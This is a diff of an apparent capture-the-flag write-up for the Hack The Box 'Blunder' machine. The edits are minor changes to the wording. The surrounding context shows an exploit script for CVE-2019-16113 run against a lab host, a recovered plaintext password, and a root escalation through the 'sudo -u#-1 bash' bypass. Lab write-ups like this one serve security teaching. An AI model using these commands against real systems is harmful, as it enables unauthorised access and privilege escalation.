@@ -88,7 +88,7 @@ kali@kali:~/Desktop/htb/CVE-2019-16113$ python CVE-2019-16113.py -u http://10.10
 ```
 
 ### 6. Enumerate from the foothold
-This exploit gained me the www-data user, from which I could enumerate quite a bit, but of course the www-data permissions prevented me from actually reading a lot of files. However I had an idea of what might be accessible, and so prioritised checking the network service files, including the ftp service that was noticed during the scan. In the /ftp directory I found a note amongst some random files:
+This exploit gained me the www-data user, which prevented me from actually reading a lot of files. However I had an idea of what might be accessible, and so prioritised checking the network service files, including the ftp service that was noticed during the scan. In the /ftp directory I found a note amongst some random files:
 
 ```bash
 www-data@blunder:/ftp$ cat note.txt
@@ -122,7 +122,7 @@ hugo@blunder:~$ cat user.txt
 The password belonged to the user hugo, which allowed me to claim the user flag.
 
 ### 8. Escalate privileges
-When I got the user, straight away I did sudo -l and noted the root account appeared to be disabled for the user. This didn't bode well for getting to root.
+When I got the user, straight away I did sudo -l and noted the root account appeared to be disabled for the user.
 ```bash
 sudo -l
 Password: Password120
@@ -146,5 +146,3 @@ hugo@blunder:~$ sudo -u#-1 bash
 root@blunder:/home/hugo# whoami
 root
 ```
-
-
